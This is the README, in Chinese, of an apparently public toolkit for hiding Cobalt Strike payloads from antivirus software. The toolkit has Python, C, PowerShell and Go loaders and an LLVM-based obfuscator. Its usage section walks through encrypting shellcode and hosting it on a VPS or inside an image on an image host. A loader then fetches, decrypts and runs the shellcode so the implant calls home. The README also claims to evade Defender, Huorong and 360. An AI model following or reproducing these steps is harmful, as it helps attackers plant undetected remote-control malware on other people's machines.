# CS-Avoid-killing
总的来说，通过应用程序的二进制特征字符串来进行恶意软件的识别仍然是杀软最常使用的静态分析方式，而动态分析（沙箱、虚拟机等）的查杀可以通过反调试、反沙箱等技术绕过，所以尽量减少恶意程序的二进制特征仍是避免被查杀的重要手段。

CS免杀,包括python版和C版本的(经测试Python打包的方式在win10上存在bug,无法运行,Win7测试无异常)

除了使用特定语言来混淆二进制特征外，也可以实现一个通用的混淆器来对任意程序实现二进制层面的混淆。本项目实现的通用混淆器是一款基于 LLVM-17 的混淆器，它利用 LLVM 的新的pass实现插件功能，可以实现对多种语言和平台的代码混淆。

- V4.0: 实现了一个通用的代码混淆器，借助LLVM可以实现对任意程序的二进制的混淆，理论来说是一种对抗杀软静态扫描的通用方法。该混淆器是在obfuscator的基础上进行重写的，参考：https://github.com/obfuscator-llvm/obfuscator

- V3.1: 增加了go版本(可过火绒/360/defender)

- V3.0: 想办法结合更多免杀技术(想去研究下进程注入/文件捆绑,不知道免杀效果怎样)

- V2.0: 开发成在线免杀平台(已完成)

    > PS: 在实际使用中发现图形化界面不利于和其他工具结合,相比之下命令行的方式更具有扩展性
    > 
    > 关于自己写的在线免杀平台,暂不考虑开源,主要是觉得目前的技术还比较薄弱,如果有师傅想体验可以联系我

- ~~V2.0:开发出UI界面~~

- V1.7:加入Powershell的免杀(已完成)

- V1.5: 加入C版本CS免杀(已完成)

- V1.0: 目前测试可以过Defender/火绒的静杀+动杀,360还没测= =不想装360全家桶了,可以自行测试


## 依赖环境

Generic Obfuscator:

- 使用下列命令安装llvm-17：
```
git clone --depth 1 -b release/17.x https://github.com/llvm/llvm-project.git
mkdir build
cmake -G Ninja -DLLVM_ENABLE_PROJECTS="clang;lld" -DLLVM_TARGETS_TO_BUILD="X86;ARM;AArch64" -DCMAKE_BUILD_TYPE=Release -DLLVM_INCLUDE_TESTS=OFF -DLLVM_ENABLE_RTTI=ON -DLLVM_OBFUSCATION_LINK_INTO_TOOLS=
ON -DCMAKE_INSTALL_PREFIX=./build/ ../llvm-project/llvm
ninja -j8
ninja install
```

Python: 

- python2
- pyinstaller
- requests

C: VS2019默认就够了

Powershell: Win10上测试没有问题,也就是ps5.1,更低版本未测试

Go: go

## 安装

其他版本是便携使用的，只需要克隆项目即可。
`git clone https://github.com/Gality369/CS-Avoid-killing.git`

Generic Obfuscator需要额外的安装：
```
cd Generic_obfuscator
mkdir build
cd build
cmake ..
make -j `nproc`
```

## 使用

1. 先通过CS生成C格式的shellcode:` Attacks -> packages -> Payload Generator `选择一个listener然后生成一个C的shellcode(其实就是二进制代码)

2. Python版:

   > 1. 将生成的shellcode填入generator.py的shellcode变量中,填入一个Key,用于后续的RC4加密
   > 2. 运行generator.py,生成的payload自动保存在payload.txt中.
   > 3. 将payload.txt上传到你的VPS中,后续生成的加载器会从VPS中获取加密shellcode并在本地解密后执行
   > 4. 将在VPS上的payload路径填入PyLoader.py的url变量中,填入你刚刚设置的Key
   > 5. 用`python pyinstaller.py -F -w PyLoader.py`打包文件,可执行文件在pyshellcode文件夹下的dist中,双击运行可以看到主机上线

3. C版本:

   > 1. 按要求填入你自己的Key,shellcdoe长度和shellcode,执行
   > 2. 将第一行的数字复制进Loader的Base64ShellLen字段中,将第二行生成的加密shellcode保存在payload.txt文件中并将其放在服务器上(~~如果不叫这名或者不在跟路径,需要自己改`char request[1024] = "GET /RC4Payload32.txt HTTP/1.1\r\nHost:";`中的路径)
   > 在path中填入可以访问到payload的路径即可(Ex: /test/payload.txt)
   > 3. 在Loader中填入自己的Key和VPS的IP,编译
   > 4. 执行编译出的exe,CS上线
   
4. Powershell版本:

   > 1. 在CS中生成Powershell版本的payload.ps1
   > 2. Python3 PSconfusion.py payload.ps1 AVpayload.ps1
   > 3. 经测试能过目前所有杀软的静杀,动杀的话,由于CS中有些模块不免杀,所以加载这些模块时可能会触发动杀,这个以后再研究怎么绕过
   
5. go版本:

   > 1. 将一张不要太大的图片放入同一文件夹下
   > 2. 将生成的shellcode填入generator.py的shellcode变量中, 执行`python generator YourRC4key ImageName` ,生成的shellcode会自动追加到图片末尾
   > 3. 将图片上传至图床(找那种不会压缩的图床,保证shellcode不会被删掉)
   > 4. 将图片url和你的RC4key填入CS-Loader.go的相应位置
   > 5. 使用命令`go build -ldflags="-H windowsgui" CS-Loader.go`生成exe,可以用upx压缩下
   > 6. 执行exe,CS上线

6. 通用混淆器版本：
   
   > 1. 设置配置文件(`config/config.json`)来使能不同的混淆功能和基本配置
   > 2. 执行`<your-clang-17> -fpass-plugin=<your-generic_obfuscator.so>`

## 注意

1. pyinstaller安装细节

   > 最后一个支持python2的版本是3.6(最新版pyinstall不再支持python2)
   >
   > 网址:https://github.com/pyinstaller/pyinstaller/releases
   >
   > 需要安装pywin32:https://github.com/mhammond/pywin32

2. ~~目标是什么环境就在什么环境上打包,否则可能会出现无法上线的情况,不推荐使用py3对项目进行改造,ctypes对py3的支持不太好,会有些莫名其妙的bug~~
    感谢KingSF5师傅对python3版本的修复(崇拜~)

3. 经过测试,C版本在X86Debug模式编译下无任何问题,Release模式下会存在莫名bug,在某些电脑上无法正常上线,请根据需求自行测试

4. 编译选项不要选择动态编译,否则可能会因为目标靶机上缺少相应dll而无法运行.

5. 加载ps脚本的方式这里不做讨论,有师傅已经总结的非常好了,请自行百度

6. go版本build前建议先`set GOARCH=amd64`,同时使用64位的shellcode,32位打包出来的程序会报一个在ntdll中找不到函数的错误,曾有人提问过:https://stackoverflow.com/questions/58649055/failed-to-find-rtlcopymemory-procedure-in-ntdll-dll-only-when-goarch-386

7. 有关Generic Obfuscator的详细说明请参考`Generic_obfuscator/README.md`, 这里提供了对该混淆器的详细说明和使用方法。